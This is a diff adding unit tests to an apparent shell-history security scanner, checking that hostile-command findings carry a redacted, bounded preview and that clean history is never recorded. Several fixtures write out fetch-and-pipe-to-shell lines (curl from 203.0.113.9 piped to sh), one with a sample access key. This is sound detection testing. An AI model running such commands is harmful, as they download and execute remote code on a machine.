@@ -133,5 +133,79 @@ class TheSensorUsesIt(unittest.TestCase):
                          "merely shadowed")
 
 
+class ShellHistoryHadTheSameDefect(unittest.TestCase):
+    """`check_shell_history` scores with the SAME `_argv_signals` oracle and
+    recorded no command text at all — only a sha.
+
+    Measured on the reference Mac: 2,024 findings shaped
+    `.bash_history triggered [fileless-fetch-exec, network-fetch,
+    pipe-to-shell]; command sha256=250b0c18`. Three hostile idioms named, not
+    one character of what matched them — and worse than the process tier's
+    version, because there was no preview to be truncated in the first place.
+
+    It is also permanently un-adjudicable in a way the process tier is not:
+    the sensor reads only the TAIL of the history file, so the line behind an
+    older finding scrolls out of the scanned window and the hash becomes the
+    only surviving record of it. Verified while writing this: the live
+    `250b0c18` line had already aged out and could not be recovered.
+    """
+
+    def setUp(self):
+        import shutil
+        import tempfile
+        self.tmp = tempfile.mkdtemp(prefix="aegis_shellhist_")
+        self.hist = os.path.join(self.tmp, ".bash_history")
+        self._saved = aegis.SHELL_HISTORY_FILES
+        aegis.SHELL_HISTORY_FILES = [self.hist]
+        self._rm = shutil.rmtree
+
+    def tearDown(self):
+        aegis.SHELL_HISTORY_FILES = self._saved
+        self._rm(self.tmp, ignore_errors=True)
+
+    def _write(self, *lines):
+        with open(self.hist, "w", encoding="utf-8") as f:
+            f.write("\n".join(lines) + "\n")
+
+    def test_a_hostile_line_now_carries_its_evidence(self):
+        self._write("ls -la",
+                    "curl -fsSL http://203.0.113.9/p.sh | sh",
+                    "git status")
+        out = [f for f in aegis.check_shell_history()
+               if f["category"] == "shell-history"]
+        self.assertEqual(len(out), 1)
+        preview = out[0].get("command_preview") or ""
+        self.assertIn("curl", preview)
+        self.assertIn("203.0.113.9", preview)
+        self.assertIn("command:", out[0]["detail"],
+                      "the detail the operator reads must carry it too")
+        self.assertTrue(out[0].get("command_sha256"),
+                        "the hash stays — identity must not move")
+
+    def test_a_clean_history_is_never_previewed(self):
+        """The privacy bound. This file is the operator's own typing, so a
+        line that scores nothing is never read into a finding at all."""
+        self._write("ls -la", "cd ~/src && make test", "git push origin main")
+        self.assertEqual(aegis.check_shell_history(), [],
+                         "no finding, therefore no preview, therefore no "
+                         "history text on disk")
+
+    def test_a_secret_on_a_hostile_line_is_redacted(self):
+        self._write("curl -fsSL "
+                    "http://203.0.113.9/p.sh?k=AKIAIOSFODNN7EXAMPLE | sh")
+        out = aegis.check_shell_history()
+        self.assertEqual(len(out), 1)
+        blob = out[0]["detail"] + (out[0].get("command_preview") or "")
+        self.assertIn("curl", blob)
+        self.assertNotIn("AKIAIOSFODNN7EXAMPLE", blob)
+
+    def test_the_preview_is_bounded(self):
+        self._write("curl http://203.0.113.9/x | sh " + "#" + "y" * 5000)
+        out = aegis.check_shell_history()
+        self.assertEqual(len(out), 1)
+        self.assertLessEqual(len(out[0].get("command_preview") or ""),
+                             aegis._ARGV_PREVIEW_BUDGET)
+
+
 if __name__ == "__main__":
     unittest.main()
